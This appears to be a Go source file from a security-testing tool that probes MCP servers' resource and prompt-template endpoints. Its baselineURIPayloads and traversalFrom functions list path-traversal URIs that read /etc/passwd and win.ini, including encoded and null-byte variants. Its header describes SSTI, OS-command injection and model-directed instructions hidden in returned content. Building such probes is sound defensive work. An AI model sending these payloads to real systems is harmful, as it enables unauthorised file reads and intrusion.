// Package mcpprimitive provides security probes for the MCP content-bearing
// primitives BEYOND the tool surface — resources (resources/read) and prompt
// templates (prompts/get). It targets the parameters a client controls on those
// two calls, which are injection sinks no existing probe reaches:
//
//   - ResourceInjection attacks the resource URI: filesystem traversal (arbitrary
//     file read) and scheme abuse that turns resources/read into a server-side
//     request forgery primitive.
//   - PromptTemplateInjection attacks prompt-template arguments: server-side template
//     evaluation (SSTI/eval) and OS-command execution in the renderer.
//
// Both probes additionally score the CONTENT the server returns for smuggled
// model-directed instructions via the secondary mcpprimitive.ContentInjection
// detector — the indirect-injection / RADE class (OWASP MCP10), where a resource
// body or rendered template carries instructions aimed at the host model rather
// than at the human reader.
//
// Sibling packages: internal/probes/mcptool attacks the tool surface through
// types.ToolInvoker; internal/probes/mcptransport bypasses the protocol entirely
// with raw HTTP. This package uses types.MCPPrimitiveReader for content retrieval
// and types.MCPReconnaissance for catalog discovery. Shared payload construction
// and the out-of-band collector live in internal/mcpprobe.
//
// SIDE EFFECTS: these probes call REAL protocol methods on the target. Both
// resources/read and prompts/get are read-oriented by design, so unlike the tool
// probes there is no destructive-tool gate to apply — but a prompt renderer that
// shells out will EXECUTE the OS-command payloads this package sends, which is
// the point of the test. Point it only at systems you are authorised to attack.
package mcpprimitive

import (
	"context"
	"strings"

	mcpx "github.com/praetorian-inc/augustus/internal/recon/mcp"
	"github.com/praetorian-inc/augustus/pkg/recon"
	"github.com/praetorian-inc/augustus/pkg/types"
)

// reconContext is embedded by mcpprimitive probes to consume shared
// reconnaissance. It provides the ContextAwareProbe opt-in plus an inventory
// resolver that prefers a prior recon.MCP inventory over a second live
// enumeration.
type reconContext struct {
	store *recon.Store
}

// SetContext implements recon.ContextAwareProbe. The scan runner calls it once,
// before Probe(), with the shared observation store.
func (r *reconContext) SetContext(pc recon.ProbeContext) { r.store = pc.Recon }

// resolveInventories returns the target's MCP inventories, preferring those a
// prior recon phase already gathered and falling back to a live enumeration via
// types.MCPReconnaissance. A target that is neither described by recon nor
// capable of reconnaissance yields (nil, nil): the caller decides whether that is
// a legitimate empty result or a hard error.
//
// Callers must NOT treat an empty catalog as proof the target serves no
// resources. recon gates enumeration on the server's DECLARED capabilities and
// treats a failed list call as an empty one, so a server that serves resources
// without advertising the capability enumerates to nothing. ResourceInjection
// therefore always sends its baseline payload set regardless of what the catalog
// contains.
func (r *reconContext) resolveInventories(ctx context.Context, gen types.Generator) ([]*types.MCPInventory, error) {
	if r.store != nil {
		if invs := mcpx.InventoriesFrom(r.store); len(invs) > 0 {
			return invs, nil
		}
	}
	rec, ok := gen.(types.MCPReconnaissance)
	if !ok {
		return nil, nil
	}
	inv, err := rec.MCPInventory(ctx)
	if err != nil {
		return nil, err
	}
	if inv == nil {
		return nil, nil
	}
	return []*types.MCPInventory{inv}, nil
}

// fileSignatures are the stable content markers only a real read of the
// corresponding system file could produce. A server that echoes the requested URI
// back cannot forge them, which is what makes signature matching a deterministic,
// low-false-positive oracle (the same design the mcptool path-traversal probe
// uses).
var (
	passwdSignatures = []string{"root:x:0:0:", "# User Database", "nobody:*:", "daemon:*:"}
	winIniSignatures = []string{"[extensions]", "[fonts]"}
)

// uriPayload pairs a resource URI to request with the signatures its returned
// content must contain to prove the read escaped its intended scope.
type uriPayload struct {
	uri        string
	signatures []string
	// class labels how the payload attacks the URI, for report grouping.
	class string
}

// Payload classes recorded in attempt metadata.
const (
	classTraversal       = "resource-traversal"
	classTemplateArg     = "resource-template-arg"
	classSSRF            = "resource-ssrf"
	classResourceContent = "resource-content"
	classPromptSSTI      = "prompt-template-injection"
	classPromptOOBCmd    = "prompt-command-injection"
	classPromptContent   = "prompt-content"
)

// baselineURIPayloads are tried against every target regardless of what the
// catalog advertises, because a server may serve resources it never declared (see
// resolveInventories). They cover absolute reads, traversal from a relative base,
// and the encoded variants that defeat naive string filters.
func baselineURIPayloads() []uriPayload {
	out := []uriPayload{
		{uri: "file:///etc/passwd", signatures: passwdSignatures, class: classTraversal},
		{uri: "file://../../../../../../etc/passwd", signatures: passwdSignatures, class: classTraversal},
		{uri: "file:///../../../../../../etc/passwd", signatures: passwdSignatures, class: classTraversal},
		{uri: "/etc/passwd", signatures: passwdSignatures, class: classTraversal},
		{uri: "../../../../../../etc/passwd", signatures: passwdSignatures, class: classTraversal},
		{uri: "..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd", signatures: passwdSignatures, class: classTraversal},
		{uri: "file:///etc/passwd%00.txt", signatures: passwdSignatures, class: classTraversal},
		{uri: "file:///C:/windows/win.ini", signatures: winIniSignatures, class: classTraversal},
		{uri: "file:///windows/win.ini", signatures: winIniSignatures, class: classTraversal},
		{uri: "..\\..\\..\\..\\..\\..\\windows\\win.ini", signatures: winIniSignatures, class: classTraversal},
	}
	return out
}

// traversalFrom derives traversal payloads from an advertised resource URI by
// replacing its final path segment with a traversal chain. A server that
// validates the scheme or a directory prefix but then joins the rest of the URI
// onto a base path accepts these where a bare "file:///etc/passwd" is rejected —
// the same prefix-preserving idea the tool path-traversal probe applies to
// disclosed sandbox prefixes.
func traversalFrom(advertised string) []uriPayload {
	idx := strings.LastIndex(advertised, "/")
	if idx <= 0 || idx == len(advertised)-1 {
		return nil
	}
	base := advertised[:idx+1]
	return []uriPayload{
		{uri: base + "../../../../../../etc/passwd", signatures: passwdSignatures, class: classTraversal},
		{uri: base + "..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd", signatures: passwdSignatures, class: classTraversal},
		{uri: base + "....//....//....//....//....//....//etc/passwd", signatures: passwdSignatures, class: classTraversal},
	}
}

// expandTemplate replaces every placeholder in a URI template — {param} and the
// RFC 6570 operator forms such as {+path} / {?q} — with value, yielding a
// concrete URI to request. Servers that interpolate a template parameter into a
// filesystem path or an outbound URL are the sink this reaches. Returns "" when
// the template carries no placeholder.
func expandTemplate(tpl, value string) string {
	if !strings.Contains(tpl, "{") {
		return ""
	}
	var b strings.Builder
	rest := tpl
	for {
		start := strings.Index(rest, "{")
		if start < 0 {
			b.WriteString(rest)
			break
		}
		end := strings.Index(rest[start:], "}")
		if end < 0 {
			b.WriteString(rest)
			break
		}
		b.WriteString(rest[:start])
		b.WriteString(value)
		rest = rest[start+end+1:]
	}
	return b.String()
}

// promptArgs builds the argument map for one prompts/get call: the payload in
// injectArg, and a benign placeholder for every other declared argument so the
// render reaches the sink instead of failing argument validation.
//
// Unlike tool arguments, MCP prompt arguments carry NO type information — the
// spec declares them as name/description/required only — so there is no schema to
// consult and every value is a string. That is why this cannot reuse the
// tool-schema helpers in internal/probes/mcptool.
func promptArgs(args []types.MCPPromptArgument, injectArg, payload string) map[string]string {
	out := map[string]string{injectArg: payload}
	for _, a := range args {
		if a.Name == injectArg || !a.Required {
			continue
		}
		out[a.Name] = "test"
	}
	return out
}
